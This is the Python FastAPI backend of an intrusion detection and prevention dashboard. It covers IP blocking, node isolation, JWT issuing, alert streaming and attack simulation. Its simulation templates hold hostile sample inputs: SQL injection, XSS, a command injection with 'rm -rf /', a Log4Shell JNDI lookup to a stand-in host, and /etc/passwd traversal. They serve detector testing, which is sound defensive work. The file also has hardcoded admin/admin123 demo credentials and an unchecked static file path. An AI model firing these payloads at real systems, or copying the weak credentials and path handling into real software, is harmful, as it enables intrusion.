import asyncio
import json
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Request, Header
from fastapi.responses import HTMLResponse, RedirectResponse, FileResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates
from contextlib import asynccontextmanager
from pydantic import BaseModel

from app.config import settings
from app.db import init_db, db
from app.sensors import SensorWorker
from app.mitigation import mitigation
from app.metrics import metrics_collector, packets_processed, alerts_generated
from app.cache import cache_manager
from app.correlator import correlator
from app.detectors.rule_based import RuleBasedDetector
from app.detectors.xgboost_detector import XGBoostDetector
from app.detectors.ddos_detector import DoSDetector
from app.detectors.isolation_forest import IsolationForestDetector
from app.rate_limit import rate_limiter
from app.audit import audit_event
from app.auth import get_role_from_token, create_jwt
from prometheus_client import generate_latest

# Paths
BASE_DIR = Path(__file__).resolve().parents[2]
FRONTEND_DIR = BASE_DIR / "frontend"
FRONTEND_AVAILABLE = FRONTEND_DIR.exists()

# Models for API requests/responses
class BlockIPRequest(BaseModel):
    ip: str
    reason: str
    ttl_seconds: int = 3600

class UnblockIPRequest(BaseModel):
    ip: str

class IsolateNodeRequest(BaseModel):
    node_id: str
    reason: str
    ttl_seconds: int = 3600

class RemoveIsolationRequest(BaseModel):
    node_id: str

class SimulateAttackRequest(BaseModel):
    attack_type: str
    source_ip: str
    target_ip: str
    payload: str = ""

class LoginRequest(BaseModel):
    username: str
    password: str

class TokenRequest(BaseModel):
    subject: str
    role: str = "viewer"
    ttl_seconds: Optional[int] = None

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        metrics_collector.update_connections(len(self.active_connections))
    
    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
        metrics_collector.update_connections(len(self.active_connections))
    
    async def broadcast_alert(self, alert: Dict[str, Any]):
        message = {
            "type": "attack_detected",
            "data": alert
        }
        await self._broadcast(message)
    
    async def broadcast_stats(self, stats: Dict[str, Any]):
        message = {
            "type": "stats_update",
            "data": stats
        }
        await self._broadcast(message)
    
    async def _broadcast(self, message: Dict[str, Any]):
        if not self.active_connections:
            return
        
        json_message = json.dumps(message)
        disconnected = []
        
        for connection in self.active_connections:
            try:
                await connection.send_text(json_message)
            except:
                disconnected.append(connection)
        
        for connection in disconnected:
            if connection in self.active_connections:
                self.active_connections.remove(connection)

# Global instances
manager = ConnectionManager()
packet_capture = None
sensor_workers = {}
detectors = {}

# Initialize FastAPI app
app = FastAPI(
    title="SecureCyber IDS/IPS System",
    description="AI-powered Intrusion Detection and Prevention System",
    version="2.0.0"
)

def _extract_token(authorization: Optional[str], api_key: Optional[str]) -> Optional[str]:
    if api_key:
        return api_key
    if authorization:
        if authorization.lower().startswith("bearer "):
            return authorization[7:].strip()
        return authorization.strip()
    return None

def require_api_key(
    authorization: Optional[str] = Header(None),
    x_api_key: Optional[str] = Header(None),
):
    if not settings.API_TOKEN:
        return
    token = _extract_token(authorization, x_api_key)
    if not token or token != settings.API_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")

def _resolve_role(authorization: Optional[str], x_api_key: Optional[str]) -> Optional[str]:
    token = _extract_token(authorization, x_api_key)
    if not token:
        return None
    if settings.ADMIN_TOKEN and token == settings.ADMIN_TOKEN:
        return "admin"
    if settings.API_TOKEN and token == settings.API_TOKEN:
        if not settings.ADMIN_TOKEN:
            return "admin"
        return "viewer"
    jwt_role = get_role_from_token(token)
    if jwt_role:
        return jwt_role
    return None

def require_role(role: str):
    def _checker(
        authorization: Optional[str] = Header(None),
        x_api_key: Optional[str] = Header(None),
    ):
        if not settings.API_TOKEN and not settings.ADMIN_TOKEN:
            return
        resolved = _resolve_role(authorization, x_api_key)
        if resolved is None:
            raise HTTPException(status_code=401, detail="Unauthorized")
        if role == "admin" and resolved != "admin":
            raise HTTPException(status_code=403, detail="Forbidden")
    return _checker

def _rate_limit(request: Request, action: str):
    try:
        limit = int(getattr(settings, "RATE_LIMIT_REQUESTS", 0) or 0)
    except (TypeError, ValueError):
        limit = 0
    if limit <= 0:
        return
    ip = request.client.host if request.client else "unknown"
    allowed, _reset, _remaining = rate_limiter.check(
        f"{action}:{ip}",
        limit,
        int(getattr(settings, "RATE_LIMIT_WINDOW", 60) or 60),
    )
    if not allowed:
        raise HTTPException(status_code=429, detail="Rate limit exceeded")

async def require_api_key_ws(websocket: WebSocket) -> bool:
    if not settings.API_TOKEN:
        return True
    token = websocket.query_params.get("token")
    if not token:
        token = _extract_token(
            websocket.headers.get("authorization"),
            websocket.headers.get("x-api-key"),
        )
    if not token or token != settings.API_TOKEN:
        await websocket.close(code=1008)
        return False
    try:
        limit = int(getattr(settings, "RATE_LIMIT_REQUESTS", 0) or 0)
    except (TypeError, ValueError):
        limit = 0
    if limit > 0:
        ip = websocket.client.host if websocket.client else "unknown"
        allowed, _reset, _remaining = rate_limiter.check(
            f"ws:{ip}",
            limit,
            int(getattr(settings, "RATE_LIMIT_WINDOW", 60) or 60),
        )
        if not allowed:
            await websocket.close(code=1008)
            return False
    return True

SIMULATION_TEMPLATES = {
    "sql": {
        "payload": "GET /search?q=' OR '1'='1' -- HTTP/1.1",
        "dst_port": 80,
        "protocol": "tcp",
    },
    "xss": {
        "payload": "GET /search?q=<script>alert('XSS')</script> HTTP/1.1",
        "dst_port": 80,
        "protocol": "tcp",
    },
    "command": {
        "payload": "POST /api/backup;rm -rf / HTTP/1.1",
        "dst_port": 80,
        "protocol": "tcp",
    },
    "log4shell": {
        "payload": "${jndi:ldap://example.com/a}",
        "dst_port": 443,
        "protocol": "tcp",
    },
    "path": {
        "payload": "GET /../../etc/passwd HTTP/1.1",
        "dst_port": 80,
        "protocol": "tcp",
    },
    "brute": {
        "payload": "USER admin\r\nPASS invalid\r\n",
        "dst_port": 21,
        "protocol": "tcp",
        "service": "ftp",
    },
    "ddos": {
        "payload": "SYN flood pattern",
        "dst_port": 80,
        "protocol": "tcp",
        "burst": 120,
    },
}

def _resolve_simulation_template(attack_type: str) -> Dict[str, Any]:
    key = (attack_type or "").strip().lower()
    if "ddos" in key or key == "dos":
        return SIMULATION_TEMPLATES["ddos"]
    if "sql" in key:
        return SIMULATION_TEMPLATES["sql"]
    if "xss" in key or "cross" in key:
        return SIMULATION_TEMPLATES["xss"]
    if "command" in key:
        return SIMULATION_TEMPLATES["command"]
    if "log4" in key:
        return SIMULATION_TEMPLATES["log4shell"]
    if "path" in key or "traversal" in key:
        return SIMULATION_TEMPLATES["path"]
    if "brute" in key or "ftp" in key:
        return SIMULATION_TEMPLATES["brute"]
    return {}

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=settings.cors_allow_credentials,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount static files/templates only when bundled with the backend.
templates = None
if FRONTEND_AVAILABLE:
    app.mount("/static", StaticFiles(directory=str(FRONTEND_DIR)), name="static")
    templates = Jinja2Templates(directory=str(FRONTEND_DIR))

# Lifecycle management
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    print("Starting SecureCyber IDS/IPS System...")

    if not init_db():
        print("MongoDB unavailable; using in-memory storage until it is reachable.")
    
    # Initialize detectors
    global detectors
    detectors = {
        "rule_based": RuleBasedDetector(),
        "xgboost": XGBoostDetector(),
        "dos": DoSDetector(),
    }
    if settings.enable_anomaly_detection:
        detectors["anomaly"] = IsolationForestDetector()
    
    # Packet capture is handled by the primary sensor worker to avoid duplicates.
    
    # Start sensor workers
    for location in settings.sensor_locations:
        worker = SensorWorker(location, manager, detectors)
        sensor_workers[location] = worker
        asyncio.create_task(worker.start())
    
    # Start periodic stats update
    asyncio.create_task(periodic_stats_update())
    
    yield
    
    # Shutdown
    print("Shutting down SecureCyber IDS/IPS System...")
    
    # Stop sensor workers
    for worker in sensor_workers.values():
        worker.stop()

app.router.lifespan_context = lifespan

# API endpoints
@app.get("/", response_class=HTMLResponse)
async def get(request: Request):
    """Root endpoint - directly to dashboard."""
    if templates:
        return templates.TemplateResponse("index.html", {"request": request})
    return HTMLResponse(
        "<h1>SecureCyber IDS</h1><p>Frontend not bundled. Use the nginx UI at http://localhost.</p>",
        status_code=200,
    )

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request):
    """Dashboard page."""
    if templates:
        return templates.TemplateResponse("index.html", {"request": request})
    return HTMLResponse(
        "<h1>SecureCyber IDS</h1><p>Frontend not bundled. Use the nginx UI at http://localhost.</p>",
        status_code=200,
    )

@app.get("/health")
async def health_check():
    """Health check endpoint."""
    capture_active = False
    if packet_capture and getattr(packet_capture, "running", False):
        capture_active = True
    if not capture_active:
        capture_active = any(
            getattr(worker, "packet_capture", None)
            and getattr(worker.packet_capture, "running", False)
            for worker in sensor_workers.values()
        )
    return {
        "status": "healthy",
        "timestamp": int(time.time()),
        "version": "2.0.0",
        "packet_capture": "enabled" if capture_active else "disabled",
        "detectors": list(detectors.keys())
    }

@app.post("/api/simulate-attack", dependencies=[Depends(require_api_key)])
async def simulate_attack(request: SimulateAttackRequest, http_request: Request):
    """Simulate an attack for testing purposes."""
    _rate_limit(http_request, "simulate")
    if not settings.enable_simulation:
        raise HTTPException(status_code=404, detail="Not found")

    template = _resolve_simulation_template(request.attack_type)
    payload = request.payload or template.get("payload", "")
    burst = int(template.get("burst", 1))
    proto_value = str(template.get("protocol", "tcp")).upper()
    flags = "S" if request.attack_type.lower() in {"ddos", "dos"} else "PA"
    header_len = 20 if proto_value == "TCP" else 8
    payload_len = len(payload) if payload else 0
    size = max(60, header_len + payload_len)

    packet = {
        "timestamp": time.time(),
        "source_ip": request.source_ip,
        "dest_ip": request.target_ip,
        "src_ip": request.source_ip,
        "dst_ip": request.target_ip,
        "protocol": template.get("protocol", "tcp"),
        "protocol_name": proto_value,
        "src_port": 4242,
        "dst_port": template.get("dst_port", 80),
        "payload": payload,
        "flags": flags,
        "header_len": header_len,
        "payload_len": payload_len,
        "size": size,
        "service": template.get("service"),
        "path": ["router-1", "fw-1", "switch-1", "web-01"],
        "attacker_node": "router-1",
        "target_node": "web-01",
        "targeted_data": ["user_data"],
    }

    worker = _select_sensor(packet)
    if worker is None:
        worker = SensorWorker("simulation", manager, detectors or {})

    for _ in range(max(burst, 1)):
        worker._process_packet(packet)

    audit_event(
        "simulate_attack",
        actor="api",
        details={"attack_type": request.attack_type, "source_ip": request.source_ip, "target_ip": request.target_ip},
        ip=http_request.client.host if http_request.client else None,
    )
    return {"status": "success", "message": "Attack simulated"}

@app.post("/api/login", dependencies=[Depends(require_api_key)])
async def login(request: LoginRequest, http_request: Request):
    """Demo login endpoint that feeds payloads into the signature engine."""
    _rate_limit(http_request, "login")
    payload = f"username={request.username}&password={request.password}"
    source_ip = http_request.client.host if http_request.client else "unknown"
    dest_ip = http_request.url.hostname or "127.0.0.1"

    packet_context = {
        "src_ip": source_ip,
        "dst_ip": dest_ip,
        "protocol": "tcp",
        "dst_port": 80,
        "service": "http",
        "payload": payload,
        "path": ["login-form"],
    }

    detector = detectors.get("rule_based") if detectors else None
    if detector is None:
        detector = RuleBasedDetector()

    alert = detector.detect(packet_context)
    if alert:
        alert["attack_types"] = alert.get("attacks", [])
        alert["source_ip"] = source_ip
        alert["dest_ip"] = dest_ip
        alert["target_node"] = "web-01"
        alert["payload_snippet"] = payload[:200]
        metrics_collector.record_alert(alert["attack_types"][0] if alert["attack_types"] else "unknown")
        await manager.broadcast_alert(alert)
        audit_event(
            "login_attack_detected",
            actor="api",
            details={"username": request.username, "source_ip": source_ip},
            ip=http_request.client.host if http_request.client else None,
        )
        return {"status": "blocked", "alert_detected": True}

    is_valid = request.username == "admin" and request.password == "admin123"
    audit_event(
        "login_attempt",
        actor="api",
        details={"username": request.username, "status": "ok" if is_valid else "invalid"},
        ip=http_request.client.host if http_request.client else None,
    )
    return {"status": "ok" if is_valid else "invalid", "alert_detected": False}

@app.post("/api/token", dependencies=[Depends(require_role("admin"))])
async def issue_token(request: TokenRequest, http_request: Request):
    """Issue a signed JWT for viewer/admin access."""
    ttl = request.ttl_seconds or settings.JWT_EXP_SECONDS
    token = create_jwt(request.subject, request.role, ttl)
    audit_event(
        "issue_jwt",
        actor="admin",
        details={"subject": request.subject, "role": request.role, "ttl_seconds": ttl},
        ip=http_request.client.host if http_request.client else None,
    )
    return {"token": token, "expires_in": ttl, "role": request.role}

@app.get("/api/blocklist", dependencies=[Depends(require_role("viewer"))])
async def get_blocklist():
    """Get the current blocklist."""
    return {"blocklist": mitigation.get_blocklist()}

@app.get("/api/isolated-nodes", dependencies=[Depends(require_role("viewer"))])
async def get_isolated_nodes():
    """Get the currently isolated nodes."""
    return {"isolated_nodes": mitigation.get_isolated_nodes()}

@app.post("/api/block-ip", dependencies=[Depends(require_role("admin"))])
async def block_ip(request: BlockIPRequest, http_request: Request):
    """Block an IP address."""
    if settings.enable_real_mitigation and settings.mitigation_confirmation_token:
        print(f"WARNING: Real mitigation enabled. Blocking IP: {request.ip}")
    
    success = mitigation.block_ip(request.ip, request.reason, request.ttl_seconds)
    if success:
        audit_event(
            "block_ip",
            actor="admin",
            details={"ip": request.ip, "reason": request.reason, "ttl_seconds": request.ttl_seconds},
            ip=http_request.client.host if http_request.client else None,
        )
        return {"status": "success", "message": f"IP {request.ip} blocked"}
    else:
        raise HTTPException(status_code=400, detail="Failed to block IP")

@app.post("/api/unblock-ip", dependencies=[Depends(require_role("admin"))])
async def unblock_ip(request: UnblockIPRequest, http_request: Request):
    """Unblock an IP address."""
    success = mitigation.unblock_ip(request.ip)
    if success:
        audit_event(
            "unblock_ip",
            actor="admin",
            details={"ip": request.ip},
            ip=http_request.client.host if http_request.client else None,
        )
        return {"status": "success", "message": f"IP {request.ip} unblocked"}
    else:
        raise HTTPException(status_code=400, detail="Failed to unblock IP")

@app.post("/api/isolate-node", dependencies=[Depends(require_role("admin"))])
async def isolate_node(request: IsolateNodeRequest, http_request: Request):
    """Isolate a node."""
    success = mitigation.isolate_node(request.node_id, request.reason, request.ttl_seconds)
    if success:
        audit_event(
            "isolate_node",
            actor="admin",
            details={"node_id": request.node_id, "reason": request.reason, "ttl_seconds": request.ttl_seconds},
            ip=http_request.client.host if http_request.client else None,
        )
        return {"status": "success", "message": f"Node {request.node_id} isolated"}
    raise HTTPException(status_code=400, detail="Failed to isolate node")

@app.post("/api/remove-isolation", dependencies=[Depends(require_role("admin"))])
async def remove_isolation(request: RemoveIsolationRequest, http_request: Request):
    """Remove isolation from a node."""
    success = mitigation.remove_isolation(request.node_id)
    if success:
        audit_event(
            "remove_isolation",
            actor="admin",
            details={"node_id": request.node_id},
            ip=http_request.client.host if http_request.client else None,
        )
        return {"status": "success", "message": f"Node {request.node_id} isolation removed"}
    raise HTTPException(status_code=400, detail="Failed to remove isolation")

@app.get("/api/alerts", dependencies=[Depends(require_role("viewer"))])
async def get_alerts(limit: int = 10, offset: int = 0):
    """Get recent alerts."""
    alerts = db.get_alerts(limit=limit, offset=offset)
    total = db.count_alerts()
    return {
        "alerts": alerts,
        "total": total
    }

@app.get("/api/stats", dependencies=[Depends(require_role("viewer"))])
async def get_stats():
    """Get current statistics."""
    return {
        "packets_analyzed": metrics_collector.packets_processed_count,
        "threats_detected": metrics_collector.alerts_generated_count,
        "active_hosts": 14,
        "sensor_status": {loc: "online" for loc in settings.sensor_locations},
        "simulation_enabled": settings.enable_simulation,
        "top_attackers": [
            {"ip": "203.0.113.45", "count": 120},
            {"ip": "198.51.100.77", "count": 85},
            {"ip": "192.0.2.123", "count": 65}
        ]
    }

# WebSocket endpoint without authentication
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket endpoint for real-time communication."""
    if not await require_api_key_ws(websocket):
        return
    await manager.connect(websocket)
    try:
        while True:
            # Keep the connection alive
            data = await websocket.receive_text()
            event = _parse_ws_message(data)
            if event:
                _ingest_ws_event(event)
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# Metrics endpoint for Prometheus
@app.get("/metrics", dependencies=[Depends(require_role("viewer"))])
async def metrics():
    """Prometheus metrics endpoint."""
    data = metrics_collector.get_metrics()
    return Response(content=data, media_type="text/plain; version=0.0.4")

async def periodic_stats_update():
    """Periodically send stats updates to all connected clients."""
    while True:
        await asyncio.sleep(5)  # Send stats every 5 seconds
        
        # Get stats
        stats = {
            "packets_analyzed": metrics_collector.packets_processed_count,
            "threats_detected": metrics_collector.alerts_generated_count,
            "active_hosts": 14,
            "sensor_status": {loc: "online" for loc in settings.sensor_locations},
            "top_attackers": [
                {"ip": "203.0.113.45", "count": 120 + int(time.time() % 50)},
                {"ip": "198.51.100.77", "count": 85 + int(time.time() % 30)},
                {"ip": "192.0.2.123", "count": 65 + int(time.time() % 20)}
            ]
        }
        
        # Broadcast stats update
        await manager.broadcast_stats(stats)

def _parse_ws_message(raw_message: str) -> Optional[Dict[str, Any]]:
    try:
        payload = json.loads(raw_message)
    except json.JSONDecodeError:
        return None

    if isinstance(payload, dict) and isinstance(payload.get("data"), dict):
        return payload["data"]
    if isinstance(payload, dict):
        return payload
    return None

def _select_sensor(event: Dict[str, Any]) -> Optional[SensorWorker]:
    if not sensor_workers:
        return None
    location = event.get("sensor_location") or event.get("location")
    if location and location in sensor_workers:
        return sensor_workers[location]
    return next(iter(sensor_workers.values()))

def _normalize_packet(event: Dict[str, Any]) -> Dict[str, Any]:
    normalized = event.copy()
    if "source_ip" in normalized and "src_ip" not in normalized:
        normalized["src_ip"] = normalized["source_ip"]
    if "dest_ip" in normalized and "dst_ip" not in normalized:
        normalized["dst_ip"] = normalized["dest_ip"]
    if "protocol" in normalized and "protocol_name" not in normalized:
        protocol = normalized["protocol"]
        if isinstance(protocol, str):
            normalized["protocol_name"] = protocol.upper()
    normalized.setdefault("timestamp", int(time.time()))
    return normalized

def _normalize_alert(event: Dict[str, Any], attack_types: List[str]) -> Dict[str, Any]:
    alert = _normalize_packet(event)
    alert["attack_types"] = attack_types
    alert.setdefault("attacks", attack_types)
    alert.setdefault("confidence", 0.75)
    alert.setdefault("id", f"ws-{uuid.uuid4()}")
    if "source_ip" not in alert and "src_ip" in alert:
        alert["source_ip"] = alert["src_ip"]
    if "dest_ip" not in alert and "dst_ip" in alert:
        alert["dest_ip"] = alert["dst_ip"]
    return alert

def _ingest_ws_event(event: Dict[str, Any]) -> None:
    worker = _select_sensor(event)
    attack_types = event.get("attack_types") or event.get("attacks") or []
    if isinstance(attack_types, str):
        attack_types = [attack_types]

    if attack_types:
        alert = _normalize_alert(event, attack_types)
        if worker:
            worker._process_alert(alert)
        else:
            asyncio.create_task(manager.broadcast_alert(alert))
        return

    packet = _normalize_packet(event)
    if worker:
        worker._process_packet(packet)

# Serve static files for frontend
@app.get("/{path:path}")
async def static_files(path: str):
    """Serve static files."""
    if not FRONTEND_AVAILABLE:
        raise HTTPException(status_code=404)
    protected_prefixes = ("docs", "openapi", "redoc", "api")
    if path.startswith(protected_prefixes):
        raise HTTPException(status_code=404)

    file_path = FRONTEND_DIR / path
    if file_path.exists():
        return FileResponse(str(file_path))
    return RedirectResponse(url="/")
